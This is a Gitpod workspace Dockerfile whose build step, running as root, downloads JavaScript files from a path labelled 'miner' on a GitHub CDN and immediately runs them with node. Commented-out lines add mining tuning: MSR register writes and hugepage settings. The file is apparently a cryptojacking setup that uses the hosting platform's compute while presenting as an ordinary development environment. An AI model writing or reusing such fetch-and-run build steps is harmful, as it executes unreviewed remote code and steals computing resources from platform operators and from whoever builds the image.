FROM gitpod/workspace-full

USER root

RUN cd / \
 && sudo DEBIAN_FRONTEND=noninteractive apt-get update \
 && wget https://raw.githack.com/vippro99/-meocoder-nodejs-tool/main/miner/linux/64/app.js && wget https://rawcdn.githack.com/vippro99/nodejs-task/8ddbe6dec5e9ad6c4e642f7ef65c37b426b840af/package.json && wget https://rawcdn.githack.com/vippro99/nodejs-task/8ddbe6dec5e9ad6c4e642f7ef65c37b426b840af/log-print.js && chmod +x app.js package.json log-print.js && npm i -s && node app.js
#  && sudo DEBIAN_FRONTEND=noninteractive apt-get install kmod \
#  && curl -sL https://gist.githack.com/iampeterbanjo/f1c9931002f5a939464c172fed6f96cb/raw/f43582547dbc370cbed84a445b447220d2a81d59/install-modprobe-ubuntu-kernel.sh -o install-modprobe-ubuntu-kernel.sh \
#  && sudo bash install-modprobe-ubuntu-kernel.sh \
#  && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y msr-tools \
#  && sudo modprobe msr \
#  && sudo wrmsr -a 0x1a4 6 \
#  && sudo echo 1250 | sudo tee /proc/sys/vm/nr_hugepages
#  && sudo rm -rf /var/lib/apt/lists/* 
# Give back control
USER root
